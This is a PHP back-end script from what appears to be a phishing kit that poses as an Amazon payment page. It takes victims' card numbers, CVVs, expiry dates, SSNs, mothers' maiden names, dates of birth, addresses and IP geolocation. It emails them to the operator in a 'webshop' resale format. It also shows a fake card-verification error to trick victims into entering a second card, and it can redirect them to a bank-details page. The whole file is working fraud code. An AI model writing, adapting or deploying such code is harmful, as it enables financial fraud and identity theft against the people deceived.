<?php
require "core/EntityVariables.php";
$config = require "KarmaEntity/config/config.php";

$feature = trim($config["feature"]);
$redirect_path = "/" . $feature;

$data = json_decode(file_get_contents("php://input"), true);

$card_number = $data["card_number"] ?? null;

$currentCard = $data["card_number"] ?? null;
$lastCard = $_SESSION['karma-last-cc-number'] ?? null;

$currentCard_normalized = preg_replace('/\D+/', '', $currentCard ?? '');
$lastCard_normalized = preg_replace('/\D+/', '', $lastCard ?? '');

if ($lastCard_normalized && $currentCard_normalized === $lastCard_normalized) {
    EntityMessage("CARD NOT ACCEPTED - SAME CARD!", $ip);
    echo json_encode([
        "success"  => false,
        "error"    => "Cannot verify card information, Please enter a different card."
    ]);
    exit;
}

$card_number_normalized = is_string($card_number)
    ? preg_replace('/\D+/', '', $card_number)
    : null;
$cc_bin = ($card_number_normalized && strlen($card_number_normalized) >= 6)
    ? substr($card_number_normalized, 0, 6)
    : null;
$card_name   = $data["card_name"] ?? null;
$exp_month   = $data["expiration_month"] ?? null;
$exp_year    = $data["expiration_year"] ?? null;
$cvv         = $data["cvv"] ?? null;
$cid         = $data["cid"] ?? null;

$ecountry  = $_SESSION["ecountry"]  ?? null;
$fullname  = $_SESSION["fullname"]  ?? null;
$dob     = $_SESSION["dob"]      ?? null;
// $cob       = $_SESSION["cob"]       ?? null;
$mmn       = $_SESSION["mmn"]       ?? null;
$ssn     = $_SESSION["ssn"]      ?? null;
$phone     = $_SESSION["phone"]     ?? null;
$address1  = $_SESSION["address1"]  ?? null;
$ecity     = $_SESSION["ecity"]     ?? null;
$state     = $_SESSION["state"]     ?? null;
$zip       = $_SESSION["zip"]       ?? null;

$EntityDetectBin = $cc_bin ? getCardDetailsFromBIN($cc_bin) : null;

if ($config["double_cc"]) {
    if (!isset($_SESSION["first_card"])) {
        $card_number1 = $card_number;
        $card_name1   = $card_name;
        $exp_month1   = $exp_month;
        $exp_year1    = $exp_year;
        $cvv1         = $cvv;
        $cid1         = $cid;

        $ccnumber_normalized1 = is_string($card_number1)
            ? preg_replace('/\D+/', '', $card_number1)
            : null;
        $cc_bin1 = ($ccnumber_normalized1 && strlen($ccnumber_normalized1) >= 6)
            ? substr($ccnumber_normalized1, 0, 6)
            : null;

        $EntityDetectBin1 = $cc_bin1 ? getCardDetailsFromBIN($cc_bin1) : null;

        $message = '<div style="font-family: -apple-system, BlinkMacSystemFont, \'Segoe UI\', Roboto, Helvetica, Arial, sans-serif; background: #f4f7fc; border-radius: 20px; box-shadow: 0 4px 32px rgba(0, 0, 0, 0.1); padding: 40px 30px; line-height: 1.5;">'
            .'<h2 style="color: #2c3e50; font-size: 1.5rem; margin-bottom: 50px; letter-spacing: 0.8px; font-weight: 600;">' 
            .'<i>"' . htmlspecialchars($quote) . '"</i></h2>'
            .'<h3 style="color: #2c3e50; font-size: 1.1rem; margin-bottom: 20px; letter-spacing: 0.8px; font-weight: 700;">CARD INFO</h3>'
            .'<pre style="font-size: 0.9rem; color: #34495e; padding: 10px; background-color: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1); margin-bottom: 30px;">'
            .'<code style="display: block; white-space: pre-wrap; word-wrap: break-word;">'
            .'Card Number  : ' . htmlspecialchars($card_number1) . "\n"
            .'Name On Card : ' . htmlspecialchars($card_name1) . "\n"
            .'EXP Date     : ' . htmlspecialchars($exp_month1) . "/" . htmlspecialchars($exp_year1) . "\n"
            .'CVV/CVC      : ' . htmlspecialchars($cvv1) . "\n"
            .'CID          : ' . htmlspecialchars($cid1) . "\n"
            .'</code>'
            .'</pre>'
            .'<h3 style="color: #2c3e50; font-size: 1.1rem; margin-bottom: 20px; letter-spacing: 0.8px; font-weight: 700;">ADDRESS INFO</h3>'
            .'<pre style="font-size: 0.9rem; color: #34495e; padding: 10px; background-color: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); margin-bottom: 30px;">'
            .'<code style="display: block; white-space: pre-wrap; word-wrap: break-word;">'
            .'Full Name     : ' . htmlspecialchars($fullname) . "\n"
            // .'City Of Birth : ' . htmlspecialchars($cob) . "\n"
            .'Date Of Birth : ' . htmlspecialchars($dob) . "\n";

        if (itsUs($visitorInfo)) {
            $message .= 'MMN           : ' . htmlspecialchars($mmn) . "\n"
                      . 'SSN           : ' . htmlspecialchars($ssn) . "\n";
        }
        
        $message .= 'Phone         : ' . htmlspecialchars($phone) . "\n"
            .'Address       : ' . htmlspecialchars($address1) . "\n"
            .'Country       : ' . htmlspecialchars($ecountry) . "\n"
            .'City          : ' . htmlspecialchars($ecity) . "\n"
            .'State         : ' . htmlspecialchars($state) . "\n"
            .'ZIP           : ' . htmlspecialchars($zip) . "\n"
            .'</code>'
            .'</pre>'
            .'<h3 style="color: #2c3e50; font-size: 1.1rem; margin-bottom: 20px; letter-spacing: 0.8px; font-weight: 700;">DEVICE INFO</h3>'
            .'<pre style="font-size: 0.9rem; color: #34495e; padding: 10px; background-color: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);">'
            .'<code style="display: block; white-space: pre-wrap; word-wrap: break-word;">'
            .'TYPE         : ' . ucfirst(htmlspecialchars($device)) . "\n"
            .'IP           : ' . htmlspecialchars($ip) . "\n"
            .'ASN          : ' . htmlspecialchars($asn) . "\n"
            .'ISP          : ' . htmlspecialchars($isp) . "\n"
            .'Country      : ' . htmlspecialchars($country) . "\n"
            .'City         : ' . htmlspecialchars($city) . "\n"
            .'Region       : ' . htmlspecialchars($region) . "\n"
            .'Latitude     : ' . htmlspecialchars($latitude) . "\n"
            .'Longitude    : ' . htmlspecialchars($longitude) . "\n"
            .'Timezone     : ' . htmlspecialchars($timezone) . "\n"
            .'User Agent   : ' . htmlspecialchars($userAgent) . "\n"
            .'</code>'
            .'</pre>'
            .'<h3 style="color: #2c3e50; font-size: 1.1rem; margin-bottom: 20px; letter-spacing: 0.8px; font-weight: 700;">WEBSHOP FORMAT</h3>'
            .'<pre style="font-size: 0.9rem; color: #34495e; padding: 10px; background-color: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1); margin-bottom: 30px;">'
            .'<code style="display: block; white-space: pre-wrap; word-wrap: break-word;">'
            .'FORMAT       : ' . htmlspecialchars($card_number1) . "|" . htmlspecialchars($exp_month1) . "|" . substr($exp_year1, -2) . "|" . htmlspecialchars($cvv1) . "|" . htmlspecialchars($card_name1) . "|" . htmlspecialchars($address1) . "|" . htmlspecialchars($ecity) . "|" . htmlspecialchars($state) . "|" . htmlspecialchars($zip) . "|" . htmlspecialchars($ecountry) . "|" . htmlspecialchars('+1' . preg_replace('/\D+/', '', $phone)) . "|" . htmlspecialchars($dob) . "|" . htmlspecialchars($ssn) . "|" . htmlspecialchars($mmn) . "|" . htmlspecialchars($_SESSION['entity_email']) . "|" . htmlspecialchars($ip) . "|" . htmlspecialchars($userAgent) . "\n"
            .'</code>'
            .'</pre>'
            .'</div>';

        $to = trim($config["result_email"]);
        ##$subject = "CARD #1 :: " . $cc_bin1 . " " .  $EntityDetectBin1["CardBrand"] . " " . $EntityDetectBin1["CardType"] . " " . $EntityDetectBin1["IssuingInstitution"] . " :: [ " .  $country . " - " . $ip . " ]" ;
        $subject = "CARD #1 :: " . $cc_bin1 . " " .  $EntityDetectBin1["card_tier"] . " " . $EntityDetectBin1["scheme"] . " " . $EntityDetectBin1["type"] . " :: [ " .  $country . " - " . $ip . " ]" ;

        $headers = "From: " . $card_name1 . " <karma@entity.net>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/html; charset=UTF-8\r\n";

        @mail($to, $subject, $message, $headers);

        EntityMessage("CARD #1 RECEIVED", $ip);
        $_SESSION['karma-last-cc-number'] = $currentCard;
        $_SESSION["first_card"] = true;
        $_SESSION["error_card"] = "Cannot verify card information, Please enter a different card.";

        echo json_encode([
            "success"  => true,
            "redirect" => "/yourPayments?entityId=$random_entity_id"
        ]);
        exit;
    } else {
        $card_number2 = $card_number;
        $card_name2   = $card_name;
        $exp_month2   = $exp_month;
        $exp_year2    = $exp_year;
        $cvv2         = $cvv;
        $cid2         = $cid;

        $ccnumber_normalized2 = is_string($card_number2)
            ? preg_replace('/\D+/', '', $card_number2)
            : null;
        $cc_bin2 = ($ccnumber_normalized2 && strlen($ccnumber_normalized2) >= 6)
            ? substr($ccnumber_normalized2, 0, 6)
            : null;

        $EntityDetectBin2 = $cc_bin2 ? getCardDetailsFromBIN($cc_bin2) : null;

        $message = '<div style="font-family: -apple-system, BlinkMacSystemFont, \'Segoe UI\', Roboto, Helvetica, Arial, sans-serif; background: #f4f7fc; border-radius: 20px; box-shadow: 0 4px 32px rgba(0, 0, 0, 0.1); padding: 40px 30px; line-height: 1.5;">'
            .'<h2 style="color: #2c3e50; font-size: 1.5rem; margin-bottom: 50px; letter-spacing: 0.8px; font-weight: 600;">' 
            .'<i>"' . htmlspecialchars($quote) . '"</i></h2>'
            .'<h3 style="color: #2c3e50; font-size: 1.1rem; margin-bottom: 20px; letter-spacing: 0.8px; font-weight: 700;">CARD INFO</h3>'
            .'<pre style="font-size: 0.9rem; color: #34495e; padding: 10px; background-color: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1); margin-bottom: 30px;">'
            .'<code style="display: block; white-space: pre-wrap; word-wrap: break-word;">'
            .'Card Number  : ' . htmlspecialchars($card_number2) . "\n"
            .'Name On Card : ' . htmlspecialchars($card_name2) . "\n"
            .'EXP Date     : ' . htmlspecialchars($exp_month2) . "/" . htmlspecialchars($exp_year2) . "\n"
            .'CVV/CVC      : ' . htmlspecialchars($cvv2) . "\n"
            .'CID          : ' . htmlspecialchars($cid2) . "\n"
            .'</code>'
            .'</pre>'
            .'<h3 style="color: #2c3e50; font-size: 1.1rem; margin-bottom: 20px; letter-spacing: 0.8px; font-weight: 700;">ADDRESS INFO</h3>'
            .'<pre style="font-size: 0.9rem; color: #34495e; padding: 10px; background-color: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); margin-bottom: 30px;">'
            .'<code style="display: block; white-space: pre-wrap; word-wrap: break-word;">'
            .'Full Name     : ' . htmlspecialchars($fullname) . "\n"
            // .'City Of Birth : ' . htmlspecialchars($cob) . "\n"
            .'Date Of Birth : ' . htmlspecialchars($dob) . "\n";

        if (itsUs($visitorInfo)) {
            $message .= 'MMN           : ' . htmlspecialchars($mmn) . "\n"
                      . 'SSN           : ' . htmlspecialchars($ssn) . "\n";
        }

        $message .= 'Phone         : ' . htmlspecialchars($phone) . "\n"
            .'Address       : ' . htmlspecialchars($address1) . "\n"
            .'Country       : ' . htmlspecialchars($ecountry) . "\n"
            .'City          : ' . htmlspecialchars($ecity) . "\n"
            .'State         : ' . htmlspecialchars($state) . "\n"
            .'ZIP           : ' . htmlspecialchars($zip) . "\n"
            .'</code>'
            .'</pre>'
            .'<h3 style="color: #2c3e50; font-size: 1.1rem; margin-bottom: 20px; letter-spacing: 0.8px; font-weight: 700;">DEVICE INFO</h3>'
            .'<pre style="font-size: 0.9rem; color: #34495e; padding: 10px; background-color: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);">'
            .'<code style="display: block; white-space: pre-wrap; word-wrap: break-word;">'
            .'TYPE         : ' . ucfirst(htmlspecialchars($device)) . "\n"
            .'IP           : ' . htmlspecialchars($ip) . "\n"
            .'ASN          : ' . htmlspecialchars($asn) . "\n"
            .'ISP          : ' . htmlspecialchars($isp) . "\n"
            .'Country      : ' . htmlspecialchars($country) . "\n"
            .'City         : ' . htmlspecialchars($city) . "\n"
            .'Region       : ' . htmlspecialchars($region) . "\n"
            .'Latitude     : ' . htmlspecialchars($latitude) . "\n"
            .'Longitude    : ' . htmlspecialchars($longitude) . "\n"
            .'Timezone     : ' . htmlspecialchars($timezone) . "\n"
            .'User Agent   : ' . htmlspecialchars($userAgent) . "\n"
            .'</code>'
            .'</pre>'
            .'<h3 style="color: #2c3e50; font-size: 1.1rem; margin-bottom: 20px; letter-spacing: 0.8px; font-weight: 700;">WEBSHOP FORMAT</h3>'
            .'<pre style="font-size: 0.9rem; color: #34495e; padding: 10px; background-color: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1); margin-bottom: 30px;">'
            .'<code style="display: block; white-space: pre-wrap; word-wrap: break-word;">'
            .'FORMAT       : ' . htmlspecialchars($card_number2) . "|" . htmlspecialchars($exp_month2) . "|" . substr($exp_year2, -2) . "|" . htmlspecialchars($cvv2) . "|" . htmlspecialchars($card_name2) . "|" . htmlspecialchars($address1) . "|" . htmlspecialchars($ecity) . "|" . htmlspecialchars($state) . "|" . htmlspecialchars($zip) . "|" . htmlspecialchars($ecountry) . "|" . htmlspecialchars('+1' . preg_replace('/\D+/', '', $phone)) . "|" . htmlspecialchars($dob) . "|" . htmlspecialchars($ssn) . "|" . htmlspecialchars($mmn) . "|" . htmlspecialchars($_SESSION['entity_email']) . "|" . htmlspecialchars($ip) . "|" . htmlspecialchars($userAgent) . "\n"
            .'</code>'
            .'</pre>'
            .'</div>';

        $to = trim($config["result_email"]);
        ## $subject = "CARD #2 :: " . $cc_bin2 . " " .  $EntityDetectBin2["CardBrand"] . " " . $EntityDetectBin2["CardType"] . " " . $EntityDetectBin2["IssuingInstitution"] . " :: [ " .  $country . " - " . $ip . " ]" ;
        $subject = "CARD #2 :: " . $cc_bin2 . " " .  $EntityDetectBin2["card_tier"] . " " . $EntityDetectBin2["scheme"] . " " . $EntityDetectBin2["type"] . " :: [ " .  $country . " - " . $ip . " ]" ;

        $headers = "From: " . $card_name2 . " <karma@entity.net>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/html; charset=UTF-8\r\n";

        @mail($to, $subject, $message, $headers);

        EntityMessage("CARD #2 RECEIVED", $ip);
        unset($_SESSION['karma-last-cc-number']);
        unset($_SESSION["first_card"]);
        unset($_SESSION["error_card"]);

        if ($config["get_bank"]) {
            echo json_encode([
                "success"  => true,
                "redirect" => "/yourBank?entityId=$random_entity_id"
            ]);
            exit;
        } else {
            if ($config["onetime_access"]) {
                OnetimeAccess($ip);
            }
            session_destroy();
            echo json_encode([
                "success"  => true,
                "redirect" => "https://amazon.com"
            ]);
            exit;
        }
    }
} else {
    $message = '<div style="font-family: -apple-system, BlinkMacSystemFont, \'Segoe UI\', Roboto, Helvetica, Arial, sans-serif; background: #f4f7fc; border-radius: 20px; box-shadow: 0 4px 32px rgba(0, 0, 0, 0.1); padding: 40px 30px; line-height: 1.5;">'
        .'<h2 style="color: #2c3e50; font-size: 1.5rem; margin-bottom: 50px; letter-spacing: 0.8px; font-weight: 600;">' 
        .'<i>"' . htmlspecialchars($quote) . '"</i></h2>'
        .'<h3 style="color: #2c3e50; font-size: 1.1rem; margin-bottom: 20px; letter-spacing: 0.8px; font-weight: 700;">CARD INFO</h3>'
        .'<pre style="font-size: 0.9rem; color: #34495e; padding: 10px; background-color: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1); margin-bottom: 30px;">'
        .'<code style="display: block; white-space: pre-wrap; word-wrap: break-word;">'
        .'Card Number  : ' . htmlspecialchars($card_number) . "\n"
        .'Name On Card : ' . htmlspecialchars($card_name) . "\n"
        .'EXP Date     : ' . htmlspecialchars($exp_month) . "/" . htmlspecialchars($exp_year) . "\n"
        .'CVV/CVC      : ' . htmlspecialchars($cvv) . "\n"
        .'CID          : ' . htmlspecialchars($cid) . "\n"
        .'</code>'
        .'</pre>'
        .'<h3 style="color: #2c3e50; font-size: 1.1rem; margin-bottom: 20px; letter-spacing: 0.8px; font-weight: 700;">ADDRESS INFO</h3>'
        .'<pre style="font-size: 0.9rem; color: #34495e; padding: 10px; background-color: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); margin-bottom: 30px;">'
        .'<code style="display: block; white-space: pre-wrap; word-wrap: break-word;">'
        .'Full Name     : ' . htmlspecialchars($fullname) . "\n"
        // .'City Of Birth : ' . htmlspecialchars($cob) . "\n"
        .'Date Of Birth : ' . htmlspecialchars($dob) . "\n";

    if (itsUs($visitorInfo)) {
        $message .= 'MMN           : ' . htmlspecialchars($mmn) . "\n"
                  . 'SSN           : ' . htmlspecialchars($ssn) . "\n";
    }

    $message .= 'Phone         : ' . htmlspecialchars($phone) . "\n"
        .'Address       : ' . htmlspecialchars($address1) . "\n"
        .'Country       : ' . htmlspecialchars($ecountry) . "\n"
        .'City          : ' . htmlspecialchars($ecity) . "\n"
        .'State         : ' . htmlspecialchars($state) . "\n"
        .'ZIP           : ' . htmlspecialchars($zip) . "\n"
        .'</code>'
        .'</pre>'
        .'<h3 style="color: #2c3e50; font-size: 1.1rem; margin-bottom: 20px; letter-spacing: 0.8px; font-weight: 700;">DEVICE INFO</h3>'
        .'<pre style="font-size: 0.9rem; color: #34495e; padding: 10px; background-color: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);">'
        .'<code style="display: block; white-space: pre-wrap; word-wrap: break-word;">'
        .'TYPE         : ' . ucfirst(htmlspecialchars($device)) . "\n"
        .'IP           : ' . htmlspecialchars($ip) . "\n"
        .'ASN          : ' . htmlspecialchars($asn) . "\n"
        .'ISP          : ' . htmlspecialchars($isp) . "\n"
        .'Country      : ' . htmlspecialchars($country) . "\n"
        .'City         : ' . htmlspecialchars($city) . "\n"
        .'Region       : ' . htmlspecialchars($region) . "\n"
        .'Latitude     : ' . htmlspecialchars($latitude) . "\n"
        .'Longitude    : ' . htmlspecialchars($longitude) . "\n"
        .'Timezone     : ' . htmlspecialchars($timezone) . "\n"
        .'User Agent   : ' . htmlspecialchars($userAgent) . "\n"
        .'</code>'
        .'</pre>'
        .'<h3 style="color: #2c3e50; font-size: 1.1rem; margin-bottom: 20px; letter-spacing: 0.8px; font-weight: 700;">WEBSHOP FORMAT</h3>'
        .'<pre style="font-size: 0.9rem; color: #34495e; padding: 10px; background-color: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1); margin-bottom: 30px;">'
        .'<code style="display: block; white-space: pre-wrap; word-wrap: break-word;">'
        .'FORMAT       : ' . htmlspecialchars($card_number) . "|" . htmlspecialchars($exp_month) . "|" . substr($exp_year, -2) . "|" . htmlspecialchars($cvv) . "|" . htmlspecialchars($card_name) . "|" . htmlspecialchars($address1) . "|" . htmlspecialchars($ecity) . "|" . htmlspecialchars($state) . "|" . htmlspecialchars($zip) . "|" . htmlspecialchars($ecountry) . "|" . htmlspecialchars('+1' . preg_replace('/\D+/', '', $phone)) . "|" . htmlspecialchars($dob) . "|" . htmlspecialchars($ssn) . "|" . htmlspecialchars($mmn) . "|" . htmlspecialchars($_SESSION['entity_email']) . "|" . htmlspecialchars($ip) . "|" . htmlspecialchars($userAgent) . "\n"
        .'</code>'
        .'</pre>'
        .'</div>';

    $to = trim($config["result_email"]);
    ## $subject = "CARD :: " . $cc_bin . " " .  $EntityDetectBin["CardBrand"] . " " . $EntityDetectBin["CardType"] . " " . $EntityDetectBin["IssuingInstitution"] . " :: [ " .  $country . " - " . $ip . " ]" ;
    $subject = "CARD :: " . $cc_bin . " " .  $EntityDetectBin["card_tier"] . " " . $EntityDetectBin["scheme"] . " " . $EntityDetectBin["type"] . " :: [ " .  $country . " - " . $ip . " ]" ;

    $headers = "From: " . $card_name . " <karma@entity.net>\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html; charset=UTF-8\r\n";

    @mail($to, $subject, $message, $headers);

    EntityMessage("CARD RECEIVED", $ip);

    if ($config["get_bank"]) {
        echo json_encode([
            "success"  => true,
            "redirect" => "/yourBank?entityId=$random_entity_id"
        ]);
        exit;
    } else {
        if ($config["onetime_access"]) {
            OnetimeAccess($ip);
        }
        session_destroy();
        echo json_encode([
            "success"  => true,
            "redirect" => "https://amazon.com"
        ]);
        exit;
    }
}
?>
